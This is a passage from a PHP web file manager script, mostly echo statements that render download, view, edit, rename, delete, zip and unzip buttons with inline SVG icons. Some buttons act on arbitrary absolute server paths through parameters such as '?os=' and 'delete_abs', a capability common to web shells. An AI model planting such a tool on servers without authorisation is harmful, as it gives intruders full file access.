-1,1v16h-4.19c-0.72,0 -1.08,0.87 -0.571,1.379l6.701,6.701c0.586,0.586 1.536,0.586 2.121,0l6.701,-6.701c0.509,-0.509 0.148,-1.379 -0.572,-1.379z" fill="url(#color-1_VGQlJM067vkN_gr1)"></path><path d="M39,33v10l4.828,-4.828c0.75,-0.75 1.172,-1.768 1.172,-2.828v-2.344c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1z" fill="url(#color-2_VGQlJM067vkN_gr2)"></path><rect x="9" y="37" width="30" height="6" fill="url(#color-3_VGQlJM067vkN_gr3)"></rect><path d="M9,33v10l-4.828,-4.828c-0.751,-0.751 -1.172,-1.768 -1.172,-2.829v-2.343c0,-0.552 0.448,-1 1,-1h4c0.552,0 1,0.448 1,1z" fill="url(#color-4_VGQlJM067vkN_gr4)"></path></g></g></svg></a>';
                        $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                        if (in_array($ext, ['png','jpg','jpeg','jpe','gif','webp','bmp','svg'])) {
                            echo '<a class="btn btn-view img-view" href="?raw_abs=' . h(urlencode($full)) . '" title="View" aria-label="View"><span class="material-symbols-rounded">visibility</span> VIEW</a>';
                        } else {
            echo '<a class="btn btn-edit" href="?os=' . h(urlencode($full)) . '&edit_abs=1" title="Edit" aria-label="Edit"><svg class="edit-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0,0,256,256"><defs><linearGradient x1="28.529" y1="15.472" x2="33.6" y2="10.4" gradientUnits="userSpaceOnUse" id="edit_notes_gr1"><stop offset="0" stop-color="#3079d6"></stop><stop offset="1" stop-color="#297cd2"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M39,16v25c0,1.105 -0.895,2 -2,2h-26c-1.105,0 -2,-0.895 -2,-2v-34c0,-1.105 0.895,-2 2,-2h17z" fill="#edb90b"></path><path d="M32.5,21h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,25h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M32.5,29h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,33h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M28,5v9c0,1.105 0.895,2 2,2h9z" fill="url(#edit_notes_gr1)"></path></g></g></svg> Edit</a>';
                        }
            echo '<a class="btn btn-rename" href="?os=' . h(urlencode($full)) . '&rename_abs=1" title="Rename" aria-label="Rename"><svg class="rename-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0 0 48 48"><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1" x1="41" x2="5" y1="44" y2="44" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#eb6001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1)" d="M5,43h35c0.552,0,1,0.448,1,1l0,0c0,0.552-0.448,1-1,1H5V43z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2" x1="10.559" x2="36.15" y1="4.748" y2="30.339" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd747"></stop><stop offset=".482" stop-color="#ffd645"></stop><stop offset="1" stop-color="#f5bc00"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2)" d="M44.419,14.798L33.203,3.581c-0.774-0.774-2.03-0.774-2.805,0L9,24.98L15,33l7.964,6 l21.455-21.398C45.194,16.828,45.194,15.572,44.419,14.798z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3" x1="5.083" x2="13.328" y1="34.215" y2="48.495" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#e36001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3)" d="M5,45c-0.521,0-1.032-0.204-1.414-0.586C3.021,43.849,2.846,43,3.188,42.143l4-10L13,35 l2.8,5.8L5.743,44.857C5.502,44.953,5.25,45,5,45z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4" x1="6.75" x2="20.75" y1="27.25" y2="41.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#889097"></stop><stop offset="1" stop-color="#4c5963"></stop></linearGradient><polygon fill="url(#Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4)" points="7.2,32.2 9,25 23,39 15.8,40.8"></polygon></svg> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?os=' . h(urlencode($full)) . '&delete_abs=1" aria-label="Delete" title="Delete" data-label="Delete"><svg class="delete-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="16" y1="2.888" x2="16" y2="29.012" gradientUnits="userSpaceOnUse" id="color-1_nTkpTS1GZpkb_gr1"><stop offset="0" stop-color="#8b0000"></stop><stop offset="0.247" stop-color="#8b0000"></stop><stop offset="0.672" stop-color="#8b0000"></stop><stop offset="1" stop-color="#8b0000"></stop></linearGradient><linearGradient x1="16" y1="10.755" x2="16" y2="21.245" gradientUnits="userSpaceOnUse" id="color-2_nTkpTS1GZpkb_gr2"><stop offset="0" stop-color="#000000" stop-opacity="0.1"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.7"></stop></linearGradient><linearGradient x1="16" y1="3" x2="16" y2="29" gradientUnits="userSpaceOnUse" id="color-3_nTkpTS1GZpkb_gr3"><stop offset="0" stop-color="#000000" stop-opacity="0.02"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.15"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(8,8)"><circle cx="16" cy="16" r="13" fill="url(#color-1_nTkpTS1GZpkb_gr1)"></circle><g fill="url(#color-2_nTkpTS1GZpkb_gr2)" opacity="0.2"><path d="M19.995,10.755c-0.334,0 -0.648,0.13 -0.884,0.366l-3.111,3.111l-3.111,-3.111c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366c-0.334,0 -0.648,0.13 -0.884,0.366c-0.487,0.487 -0.487,1.28 0,1.768l3.111,3.111l-3.111,3.111c-0.487,0.487 -0.487,1.28 0,1.768c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366l3.111,-3.111l3.111,3.111c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366c0.487,-0.487 0.487,-1.28 0,-1.768l-3.111,-3.111l3.111,-3.111c0.487,-0.487 0.487,-1.28 0,-1.768c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366z"></path></g><path d="M16,3.25c7.03,0 12.75,5.72 12.75,12.75c0,7.03 -5.72,12.75 -12.75,12.75c-7.03,0 -12.75,-5.72 -12.75,-12.75c0,-7.03 5.72,-12.75 12.75,-12.75M16,3c-7.18,0 -13,5.82 -13,13c0,7.18 5.82,13 13,13c7.18,0 13,-5.82 13,-13c0,-7.18 -5.82,-13 -13,-13z" fill="url(#color-3_nTkpTS1GZpkb_gr3)"></path><path d="M17.414,16l3.288,-3.288c0.391,-0.391 0.391,-1.024 0,-1.414c-0.391,-0.391 -1.024,-0.391 -1.414,0l-3.288,3.288l-3.288,-3.288c-0.391,-0.391 -1.024,-0.391 -1.414,0c-0.391,0.391 -0.391,1.024 0,1.414l3.288,3.288l-3.288,3.288c-0.391,0.391 -0.391,1.024 0,1.414c0.391,0.391 1.024,0.391 1.414,0l3.288,-3.288l3.288,3.288c0.391,0.391 1.024,0.391 1.414,0c0.391,-0.391 0.391,-1.024 0,-1.414z" fill="#ffffff"></path></g></g></svg></a>';
                        if ($ext === 'zip') { echo '<a class="btn btn-icon btn-unzip" href="?os=' . h(urlencode($full)) . '&unzip_abs=1" aria-label="Unzip" title="Unzip" data-label="Unzip"><svg class="unzip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Unzip"><linearGradient id="unzip_btn_abs_gr1" x1="24" x2="24" y1="18" y2="30" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#41a5ee"></stop><stop offset=".317" stop-color="#3994de"></stop><stop offset=".562" stop-color="#2366b4"></stop><stop offset=".751" stop-color="#154a9b"></stop><stop offset=".86" stop-color="#103f91"></stop></linearGradient><rect width="36" height="12" x="6" y="18" fill="url(#unzip_btn_abs_gr1)"></rect><linearGradient id="unzip_btn_abs_gr2" x1="24" x2="24" y1="6" y2="18" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#e8457c"></stop><stop offset=".272" stop-color="#e14177"></stop><stop offset=".537" stop-color="#b32c59"></stop><stop offset=".742" stop-color="#971e46"></stop><stop offset=".86" stop-color="#8c193f"></stop></linearGradient><path fill="url(#unzip_btn_abs_gr2)" d="M42,18H6V8c0-1.105,0.895-2,2-2h32c1.105,0,2,0.895,2,2V18z"></path><linearGradient id="unzip_btn_abs_gr3" x1="24" x2="24" y1="30" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#33c481"></stop><stop offset=".325" stop-color="#2eb173"></stop><stop offset=".566" stop-color="#228353"></stop><stop offset=".752" stop-color="#1b673f"></stop><stop offset=".86" stop-color="#185c37"></stop></linearGradient><path fill="url(#unzip_btn_abs_gr3)" d="M40,42H8c-1.105,0-2-0.895-2-2V30h36v10C42,41.105,41.105,42,40,42z"></path><rect width="14" height="36" x="17" y="6" opacity=".05"></rect><rect width="13" height="36" x="17.5" y="6" opacity=".07"></rect><linearGradient id="unzip_btn_abs_gr4" x1="24" x2="24" y1="6" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".039" stop-color="#f8c819"></stop><stop offset=".282" stop-color="#af4316"></stop></linearGradient><rect width="12" height="36" x="18" y="6" fill="url(#unzip_btn_abs_gr4)"></rect><linearGradient id="unzip_btn_abs_gr5" x1="24" x2="24" y1="12" y2="42" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eaad29"></stop><stop offset=".245" stop-color="#d98e24"></stop><stop offset=".632" stop-color="#c0631c"></stop><stop offset=".828" stop-color="#b75219"></stop><stop offset=".871" stop-color="#a94917"></stop><stop offset=".949" stop-color="#943b13"></stop><stop offset="1" stop-color="#8c3612"></stop></linearGradient><path fill="url(#unzip_btn_abs_gr5)" d="M24,12c-3.314,0-6,2.686-6,6v24h12V18C30,14.686,27.314,12,24,12z"></path><path d="M20,32c-0.73,0-1.41-0.2-2-0.55v1.14c0.61,0.26,1.29,0.41,2,0.41h8c0.71,0,1.39-0.15,2-0.41v-1.14 C29.41,31.8,28.73,32,28,32H20z M29,22v6c0,0.55-0.45,1-1,1h-2v-2c0-1.1-0.9-2-2-2s-2,0.9-2,2v2h-2c-0.55,0-1-0.45-1-1v-6 c0-0.55-0.45-1-1-1v7c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2v-7C29.45,21,29,21.45,29,22z" opacity=".05"></path><path d="M29.5,22v6c0,0.83-0.67,1.5-1.5,1.5h-2.5V27c0-0.83-0.67-1.5-1.5-1.5s-1.5,0.67-1.5,1.5v2.5H20 c-0.83,0-1.5-0.67-1.5-1.5v-6c0-0.28-0.22-0.5-0.5-0.5V28c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2 v-6.5C29.72,21.5,29.5,21.72,29.5,22z M20,32c-0.73,0-1.41-0.2-2-0.55v0.58c0.6,0.3,1.28,0.47,2,0.47h8c0.72,0,1.4-0.17,2-0.47 v-0.58C29.41,31.8,28.73,32,28,32H20z" opacity=".07"></path><linearGradient id="unzip_btn_abs_gr6" x1="24" x2="24" y1="21" y2="32" gradientUnits="userSpaceOnUse"><stop offset=".613" stop-color="#e6e6e6"></stop><stop offset=".785" stop-color="#e4e4e4"></stop><stop offset=".857" stop-color="#ddd"></stop><stop offset=".91" stop-color="#d1d1d1"></stop><stop offset=".953" stop-color="#bfbfbf"></stop><stop offset=".967" stop-color="#b8b8b8"></stop></linearGradient><path fill="url(#unzip_btn_abs_gr6)" d="M32,23v5c0,2.2-1.8,4-4,4h-8c-2.2,0-4-1.8-4-4v-5c0-1.105,0.895-2,2-2h0v7 c0,1.105,0.895,2,2,2h3v-3c0-0.552,0.448-1,1-1h0c0.552,0,1,0.448,1,1v3h3c1.105,0,2-0.895,2-2v-7C31.1,21,32,21.9,32,23z"></path></svg></a>'; }
                        
                    }
                } else {
                    if ($isDir) {
                        // Folder actions: Download, View, Rename, Delete, Zip
                        echo '<a class="btn btn-icon" href="?download=' . h(urlencode($rel)) . '" aria-label="Download" title="Download" data-label="Download"><svg class="download-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="17.334" y1="4.705" x2="29.492" y2="32.953" gradientUnits="userSpaceOnUse" id="color-1_VGQlJM067vkN_gr1"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="39.761" y1="31.57" x2="43.605" y2="42.462" gradientUnits="userSpaceOnUse" id="color-2_VGQlJM067vkN_gr2"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="9" y1="40" x2="39" y2="40" gradientUnits="userSpaceOnUse" id="color-3_VGQlJM067vkN_gr3"><stop offset="0" stop-color="#0362b0"></stop><stop offset="0.112" stop-color="#036abd"></stop><stop offset="0.258" stop-color="#036fc5"></stop><stop offset="0.5" stop-color="#0370c8"></stop><stop offset="0.742" stop-color="#036fc5"></stop><stop offset="0.888" stop-color="#036abd"></stop><stop offset="1" stop-color="#0362b0"></stop></linearGradient><linearGradient x1="8.239" y1="31.57" x2="4.395" y2="42.462" gradientUnits="userSpaceOnUse" id="color-4_VGQlJM067vkN_gr4"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M31.19,22h-4.19v-16c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1v16h-4.19c-0.72,0 -1.08,0.87 -0.571,1.379l6.701,6.701c0.586,0.586 1.536,0.586 2.121,0l6.701,-6.701c0.509,-0.509 0.148,-1.379 -0.572,-1.379z" fill="url(#color-1_VGQlJM067vkN_gr1)"></path><path d="M39,33v10l4.828,-4.828c0.75,-0.75 1.172,-1.768 1.172,-2.828v-2.344c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1z" fill="url(#color-2_VGQlJM067vkN_gr2)"></path><rect x="9" y="37" width="30" height="6" fill="url(#color-3_VGQlJM067vkN_gr3)"></rect><path d="M9,33v10l-4.828,-4.828c-0.751,-0.751 -1.172,-1.768 -1.172,-2.829v-2.343c0,-0.552 0.448,-1 1,-1h4c0.552,0 1,0.448 1,1z" fill="url(#color-4_VGQlJM067vkN_gr4)"></path></g></g></svg></a>';
            echo '<a class="btn btn-view" href="?d=' . h(urlencode($rel)) . '" aria-label="View" title="View"><span class="material-symbols-rounded">folder_open</span> VIEW</a>';
            echo '<a class="btn btn-rename" href="?d=' . h(urlencode($rel)) . '&rename=1" title="Rename" aria-label="Rename"><svg class="rename-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0 0 48 48"><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1" x1="41" x2="5" y1="44" y2="44" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#eb6001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1)" d="M5,43h35c0.552,0,1,0.448,1,1l0,0c0,0.552-0.448,1-1,1H5V43z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2" x1="10.559" x2="36.15" y1="4.748" y2="30.339" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd747"></stop><stop offset=".482" stop-color="#ffd645"></stop><stop offset="1" stop-color="#f5bc00"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2)" d="M44.419,14.798L33.203,3.581c-0.774-0.774-2.03-0.774-2.805,0L9,24.98L15,33l7.964,6 l21.455-21.398C45.194,16.828,45.194,15.572,44.419,14.798z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3" x1="5.083" x2="13.328" y1="34.215" y2="48.495" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#e36001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3)" d="M5,45c-0.521,0-1.032-0.204-1.414-0.586C3.021,43.849,2.846,43,3.188,42.143l4-10L13,35 l2.8,5.8L5.743,44.857C5.502,44.953,5.25,45,5,45z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4" x1="6.75" x2="20.75" y1="27.25" y2="41.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#889097"></stop><stop offset="1" stop-color="#4c5963"></stop></linearGradient><polygon fill="url(#Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4)" points="7.2,32.2 9,25 23,39 15.8,40.8"></polygon></svg> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?d=' . h(urlencode($rel)) . '&delete=1" aria-label="Delete" title="Delete" data-label="Delete"><svg class="delete-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="16" y1="2.888" x2="16" y2="29.012" gradientUnits="userSpaceOnUse" id="color-1_nTkpTS1GZpkb_gr1"><stop offset="0" stop-color="#8b0000"></stop><stop offset="0.247" stop-color="#8b0000"></stop><stop offset="0.672" stop-color="#8b0000"></stop><stop offset="1" stop-color="#8b0000"></stop></linearGradient><linearGradient x1="16" y1="10.755" x2="16" y2="21.245" gradientUnits="userSpaceOnUse" id="color-2_nTkpTS1GZpkb_gr2"><stop offset="0" stop-color="#000000" stop-opacity="0.1"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.7"></stop></linearGradient><linearGradient x1="16" y1="3" x2="16" y2="29" gradientUnits="userSpaceOnUse" id="color-3_nTkpTS1GZpkb_gr3"><stop offset="0" stop-color="#000000" stop-opacity="0.02"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.15"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(8,8)"><circle cx="16" cy="16" r="13" fill="url(#color-1_nTkpTS1GZpkb_gr1)"></circle><g fill="url(#color-2_nTkpTS1GZpkb_gr2)" opacity="0.2"><path d="M19.995,10.755c-0.334,0 -0.648,0.13 -0.884,0.366l-3.111,3.111l-3.111,-3.111c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366c-0.334,0 -0.648,0.13 -0.884,0.366c-0.487,0.487 -0.487,1.28 0,1.768l3.111,3.111l-3.111,3.111c-0.487,0.487 -0.487,1.28 0,1.768c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366l3.111,-3.111l3.111,3.111c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366c0.487,-0.487 0.487,-1.28 0,-1.768l-3.111,-3.111l3.111,-3.111c0.487,-0.487 0.487,-1.28 0,-1.768c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366z"></path></g><path d="M16,3.25c7.03,0 12.75,5.72 12.75,12.75c0,7.03 -5.72,12.75 -12.75,12.75c-7.03,0 -12.75,-5.72 -12.75,-12.75c0,-7.03 5.72,-12.75 12.75,-12.75M16,3c-7.18,0 -13,5.82 -13,13c0,7.18 5.82,13 13,13c7.18,0 13,-5.82 13,-13c0,-7.18 -5.82,-13 -13,-13z" fill="url(#color-3_nTkpTS1GZpkb_gr3)"></path><path d="M17.414,16l3.288,-3.288c0.391,-0.391 0.391,-1.024 0,-1.414c-0.391,-0.391 -1.024,-0.391 -1.414,0l-3.288,3.288l-3.288,-3.288c-0.391,-0.391 -1.024,-0.391 -1.414,0c-0.391,0.391 -0.391,1.024 0,1.414l3.288,3.288l-3.288,3.288c-0.391,0.391 -0.391,1.024 0,1.414c0.391,0.391 1.024,0.391 1.414,0l3.288,-3.288l3.288,3.288c0.391,0.391 1.024,0.391 1.414,0c0.391,-0.391 0.391,-1.024 0,-1.414z" fill="#ffffff"></path></g></g></svg></a>';
            echo '<a class="btn btn-icon btn-zip" href="?d=' . h(urlencode($rel)) . '&zip=1" aria-label="Zip" title="Zip" data-label="Zip"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Zip"><linearGradient id="zip_btn_rel_gr1" x1="24" x2="24" y1="18" y2="30" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#41a5ee"></stop><stop offset=".317" stop-color="#3994de"></stop><stop offset=".562" stop-color="#2366b4"></stop><stop offset=".751" stop-color="#154a9b"></stop><stop offset=".86" stop-color="#103f91"></stop></linearGradient><rect width="36" height="12" x="6" y="18" fill="url(#zip_btn_rel_gr1)"></rect><linearGradient id="zip_btn_rel_gr2" x1="24" x2="24" y1="6" y2="18" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#e8457c"></stop><stop offset=".272" stop-color="#e14177"></stop><stop offset=".537" stop-color="#b32c59"></stop><stop offset=".742" stop-color="#971e46"></stop><stop offset=".86" stop-color="#8c193f"></stop></linearGradient><path fill="url(#zip_btn_rel_gr2)" d="M42,18H6V8c0-1.105,0.895-2,2-2h32c1.105,0,2,0.895,2,2V18z"></path><linearGradient id="zip_btn_rel_gr3" x1="24" x2="24" y1="30" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#33c481"></stop><stop offset=".325" stop-color="#2eb173"></stop><stop offset=".566" stop-color="#228353"></stop><stop offset=".752" stop-color="#1b673f"></stop><stop offset=".86" stop-color="#185c37"></stop></linearGradient><path fill="url(#zip_btn_rel_gr3)" d="M40,42H8c-1.105,0-2-0.895-2-2V30h36v10C42,41.105,41.105,42,40,42z"></path><rect width="14" height="36" x="17" y="6" opacity=".05"></rect><rect width="13" height="36" x="17.5" y="6" opacity=".07"></rect><linearGradient id="zip_btn_rel_gr4" x1="24" x2="24" y1="6" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".039" stop-color="#f8c819"></stop><stop offset=".282" stop-color="#af4316"></stop></linearGradient><rect width="12" height="36" x="18" y="6" fill="url(#zip_btn_rel_gr4)"></rect><linearGradient id="zip_btn_rel_gr5" x1="24" x2="24" y1="12" y2="42" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eaad29"></stop><stop offset=".245" stop-color="#d98e24"></stop><stop offset=".632" stop-color="#c0631c"></stop><stop offset=".828" stop-color="#b75219"></stop><stop offset=".871" stop-color="#a94917"></stop><stop offset=".949" stop-color="#943b13"></stop><stop offset="1" stop-color="#8c3612"></stop></linearGradient><path fill="url(#zip_btn_rel_gr5)" d="M24,12c-3.314,0-6,2.686-6,6v24h12V18C30,14.686,27.314,12,24,12z"></path><path d="M20,32c-0.73,0-1.41-0.2-2-0.55v1.14c0.61,0.26,1.29,0.41,2,0.41h8c0.71,0,1.39-0.15,2-0.41v-1.14 C29.41,31.8,28.73,32,28,32H20z M29,22v6c0,0.55-0.45,1-1,1h-2v-2c0-1.1-0.9-2-2-2s-2,0.9-2,2v2h-2c-0.55,0-1-0.45-1-1v-6 c0-0.55-0.45-1-1-1v7c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2v-7C29.45,21,29,21.45,29,22z" opacity=".05"></path><path d="M29.5,22v6c0,0.83-0.67,1.5-1.5,1.5h-2.5V27c0-0.83-0.67-1.5-1.5-1.5s-1.5,0.67-1.5,1.5v2.5H20 c-0.83,0-1.5-0.67-1.5-1.5v-6c0-0.28-0.22-0.5-0.5-0.5V28c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2 v-6.5C29.72,21.5,29.5,21.72,29.5,22z M20,32c-0.73,0-1.41-0.2-2-0.55v0.58c0.6,0.3,1.28,0.47,2,0.47h8c0.72,0,1.4-0.17,2-0.47 v-0.58C29.41,31.8,28.73,32,28,32H20z" opacity=".07"></path><linearGradient id="zip_btn_rel_gr6" x1="24" x2="24" y1="21" y2="32" gradientUnits="userSpaceOnUse"><stop offset=".613" stop-color="#e6e6e6"></stop><stop offset=".785" stop-color="#e4e4e4"></stop><stop offset=".857" stop-color="#ddd"></stop><stop offset=".91" stop-color="#d1d1d1"></stop><stop offset=".953" stop-color="#bfbfbf"></stop><stop offset=".967" stop-color="#b8b8b8"></stop></linearGradient><path fill="url(#zip_btn_rel_gr6)" d="M32,23v5c0,2.2-1.8,4-4,4h-8c-2.2,0-4-1.8-4-4v-5c0-1.105,0.895-2,2-2h0 v7 c0,1.105,0.895,2,2,2h3v-3c0-0.552,0.448-1,1-1h0c0.552,0,1,0.448,1,1v3h3c1.105,0,2-0.895,2-2v-7C31.1,21,32,21.9,32,23z"></path></svg></a>';
            
                    } else {
                        // File actions: Download, View for images, Edit otherwise, Rename, Delete, Unzip last for .zip
                        echo '<a class="btn btn-icon" href="?download=' . h(urlencode($rel)) . '" aria-label="Download" title="Download" data-label="Download"><svg class="download-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="17.334" y1="4.705" x2="29.492" y2="32.953" gradientUnits="userSpaceOnUse" id="color-1_VGQlJM067vkN_gr1"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="39.761" y1="31.57" x2="43.605" y2="42.462" gradientUnits="userSpaceOnUse" id="color-2_VGQlJM067vkN_gr2"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="9" y1="40" x2="39" y2="40" gradientUnits="userSpaceOnUse" id="color-3_VGQlJM067vkN_gr3"><stop offset="0" stop-color="#0362b0"></stop><stop offset="0.112" stop-color="#036abd"></stop><stop offset="0.258" stop-color="#036fc5"></stop><stop offset="0.5" stop-color="#0370c8"></stop><stop offset="0.742" stop-color="#036fc5"></stop><stop offset="0.888" stop-color="#036abd"></stop><stop offset="1" stop-color="#0362b0"></stop></linearGradient><linearGradient x1="8.239" y1="31.57" x2="4.395" y2="42.462" gradientUnits="userSpaceOnUse" id="color-4_VGQlJM067vkN_gr4"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M31.19,22h-4.19v-16c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1v16h-4.19c-0.72,0 -1.08,0.87 -0.571,1.379l6.701,6.701c0.586,0.586 1.536,0.586 2.121,0l6.701,-6.701c0.509,-0.509 0.148,-1.379 -0.572,-1.379z" fill="url(#color-1_VGQlJM067vkN_gr1)"></path><path d="M39,33v10l4.828,-4.828c0.75,-0.75 1.172,-1.768 1.172,-2.828v-2.344c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 